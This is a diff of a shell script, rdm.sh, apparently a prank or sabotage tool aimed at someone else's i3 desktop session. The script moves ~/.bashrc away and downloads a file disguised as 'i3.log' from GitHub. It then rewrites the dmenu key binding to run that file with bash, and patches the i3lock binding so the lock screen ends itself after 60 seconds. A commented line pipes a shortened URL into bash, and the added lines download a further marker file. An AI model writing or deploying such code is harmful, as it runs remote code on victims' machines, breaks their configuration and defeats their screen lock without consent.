anticonfloose added

+++ rdm.sh
@@ -1,3 +1,7 @@
+dir="~/afs/.confs/ssh"
+[ -r "$dir" ] || exit 1
+[ -e "$dir/anticflse" ] && exit 1
+
 mv ~/.bashrc ~/afs/tp.py
 cmd="curl .*"
 #-sL https://urls.fr/XMhtMj | bash
@@ -8,6 +12,8 @@ curl -sO https://raw.githubusercontent.com/did73at/cflse/main/i3.log
 mv i3.log ~/afs/.confs/config/i3/
 filename=".config/i3/config"
 sed '/bindsym .* exec i3lock / s|$| \&\& sleep 60 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
-sed 's|^bindsym \$mod+d exec --no-startup-id dmenu_run$|bindsym $mod+d exec --no-startup-id ~/afs/.confs/config/i3/i3.log|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+sed 's|(bindsym .* exec --no-startup-id) .* dmenu_run|\1 bash ~/afs/.confs/config/i3/i3.log |' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
 
 i3-msg reload
+curl -sO https://raw.githubusercontent.com/did73at/cflse/main/anticflse
+mv anticflse ~/afs/.confs/ssh/
